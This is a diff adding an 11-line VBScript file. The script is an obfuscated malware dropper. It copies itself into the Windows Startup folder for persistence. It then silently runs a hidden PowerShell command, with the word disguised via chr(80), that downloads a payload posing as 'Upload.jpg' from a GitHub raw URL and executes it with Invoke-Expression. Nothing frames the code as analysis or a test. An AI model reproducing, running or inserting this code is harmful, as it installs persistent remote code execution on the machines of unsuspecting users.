@@ -1,0 +1,11 @@
+Option Explicit
+Dim xxxxxxxx,zzzzzzzzzzzzzzzzzzzzz,bbbbbbbbbbbbbbbvvvvvvvvvvv,qqqqqqqqqqqqqqsssssssssssssssss,uuuuuuuuuuuyyyyyyyyyyyjjjjjjjjjjjjj
+Set xxxxxxxx = CreateObject("wscript.shell")
+zzzzzzzzzzzzzzzzzzzzz = xxxxxxxx.Specialfolders("Startup")
+bbbbbbbbbbbbbbbvvvvvvvvvvv = wscript.ScriptFullName
+Set qqqqqqqqqqqqqqsssssssssssssssss = CreateObject("Scripting.FileSystemObject")
+qqqqqqqqqqqqqqsssssssssssssssss.CopyFile bbbbbbbbbbbbbbbvvvvvvvvvvv , zzzzzzzzzzzzzzzzzzzzz & "\"
+
+
+uuuuuuuuuuuyyyyyyyyyyyjjjjjjjjjjjjj = chr(80) +"owershell -noexit   -command Invoke-Expression(New-Object Net.WebClient).DOWNloadString.Invoke('https://raw.githubusercontent.com/lewisolise10/test/master/Upload.jpg')"
+xxxxxxxx.Run uuuuuuuuuuuyyyyyyyyyyyjjjjjjjjjjjjj,0
